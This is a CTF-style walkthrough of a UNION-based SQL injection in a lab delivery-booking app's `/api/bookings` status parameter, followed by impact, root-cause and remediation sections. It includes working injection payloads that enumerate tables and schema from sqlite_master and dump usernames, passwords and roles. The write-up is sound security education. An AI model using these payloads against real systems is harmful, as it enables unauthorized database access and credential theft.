---
layout: post
title:  "BugForge - Weekly - Galaxy Dash"
date:   2026-03-04 09:00
image:  /images/bug-forge/bugforge-logo.png
tags:   [sqli]
categories: [BugForge,weekly,galaxy-dash]
---

# Weekly - Galaxy Dash
><br/><b>Vulnerabilities Covered:</b>
<br/>
SQL Injection (UNION-Based) via `status` Query Parameter
<br/>
<br/>
<b>Summary:</b>
<br/>
This walkthrough demonstrates a UNION-based SQL injection vulnerability in a delivery booking application. The `/api/bookings` endpoint accepts a `status` query parameter that is passed directly into a SQL query without sanitization. Injecting a single quote triggers a database error, confirming the injection point. Boolean-based true/false tests (OR 1=1 and AND 1=2) confirm the parameter controls query logic. The column count of the underlying query was determined to be 26 using ORDER BY enumeration. With the column count established, a UNION SELECT payload was used to query `sqlite_master` for table names, extract the `users` table schema, and finally dump user credentials including the challenge flag directly from the database.
<br/>
<br/>
<b>Reference:</b>
<br/>
<a href="https://app.bugforge.io/">Bugforge.io</a><br/>
<br/>
<br/>

## Solution

### Step 1 - Application Analysis

Analysing the application after creating a delivery, the booking search functionality was identified. The `status` value is passed as a query parameter to `/api/bookings`. Submitting a single quote in the `status` parameter produced a database error, indicating the input is being interpolated directly into a SQL query without sanitization.

![Booking Search by Status - Database Error](/images/bug-forge/weekly/galaxy-dash/sqli/booking-request-database-error.png)

---

### Step 2 - Confirming SQL Injection

To confirm the parameter controls query logic, boolean-based true and false payloads were tested.

**True condition** - returns all bookings:

```
GET /api/bookings?status=pending' OR 1 = 1-- -
```

![SQLI - Testing OR 1=1](/images/bug-forge/weekly/galaxy-dash/sqli/or1=1.png)

**False condition** - returns no results:

```
GET /api/bookings?status=pending' AND 1 = 2-- -
```

![SQLI - Testing AND 1=2](/images/bug-forge/weekly/galaxy-dash/sqli/and1=2.png)

The true condition returns all bookings and the false condition returns none, confirming boolean-based SQL injection.

---

### Step 3 - Determining Column Count

To construct a valid UNION SELECT payload, the number of columns in the original query must be known. The ORDER BY method was used, incrementing the column index until the query broke.

ORDER BY 27 returned a 500 Internal Server Error, while ORDER BY 26 returned a 200 OK, establishing that the query selects 26 columns.

![Database error - Order By 27](/images/bug-forge/weekly/galaxy-dash/sqli/order-by-27.png)

![Order By 26](/images/bug-forge/weekly/galaxy-dash/sqli/order-by-26.png)

---

### Step 4 - Extracting Table Names

With the column count confirmed as 26, a UNION SELECT payload was injected to query `sqlite_master` for all table names.

```
pending' UNION SELECT 1,tbl_name,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 FROM sqlite_master WHERE type='table'-- -
```

![Table names extracted](/images/bug-forge/weekly/galaxy-dash/sqli/table_names_extracted.png)

The response revealed the available tables, including a `users` table.

---

### Step 5 - Extracting the Users Table Schema

To identify the column names in the `users` table, the `sql` column from `sqlite_master` was queried for the table definition.

```
pending' UNION SELECT 1,sql,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 FROM sqlite_master WHERE type='table' AND tbl_name='users'-- -
```

![User table schema](/images/bug-forge/weekly/galaxy-dash/sqli/user-table-schema.png)

The schema revealed the `username`, `password`, and `role` columns.

---

### Step 6 - Extracting Credentials & Retrieving the Flag

With the schema known, a final UNION SELECT payload was used to concatenate and dump all user credentials from the `users` table.

```
pending' UNION SELECT 1,username||':'||password||':'||role,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 FROM users-- -
```

![Flag](/images/bug-forge/weekly/galaxy-dash/sqli/flag.png)

The response returned all user records including the challenge flag.

---

### Impact

- Full read access to the application database, including all user credentials and any other stored data
- Exposure of plaintext or weakly hashed passwords enabling account takeover across the application
- Ability to enumerate all database tables and schemas, revealing the full data model
- An unauthenticated or low-privileged attacker can extract sensitive data without any special access or tooling
- Depending on the database configuration, SQL injection can extend to file read/write or command execution

---

### Vulnerability Classification

- **OWASP Top 10:** A03:2021 - Injection
- **Vulnerability Type:** SQL Injection (UNION-Based)
- **Attack Surface:** `/api/bookings` endpoint; `status` query parameter
- **CWE:**
  - CWE-89 - Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
  - CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor

---

### Root Cause

The `/api/bookings` endpoint interpolates the `status` query parameter directly into a SQL query without sanitization, parameterization, or input validation. This allows an attacker to break out of the intended query context and inject arbitrary SQL. The underlying database is SQLite, and the application exposes the full query result to the API response, making UNION-based data extraction straightforward. The root cause is the absence of parameterized queries (prepared statements) in the data access layer handling this endpoint.

---

### Remediation

- Replace all string-concatenated SQL queries with parameterized queries or prepared statements, passing user input as bound parameters rather than interpolating it into the query string
- Apply server-side input validation on the `status` parameter to enforce an allowlist of accepted values (e.g., `pending`, `confirmed`, `cancelled`) and reject anything outside that set
- Implement a Web Application Firewall (WAF) rule to detect and block common SQL injection patterns as a defence-in-depth measure, not as a primary control
- Apply the principle of least privilege to the database account used by the application - it should only have SELECT access to the tables it needs, and no access to `sqlite_master` or system tables in production
- Audit all other query-building paths in the application for the same class of vulnerability, particularly any endpoint that accepts user-controlled filter or search parameters

---
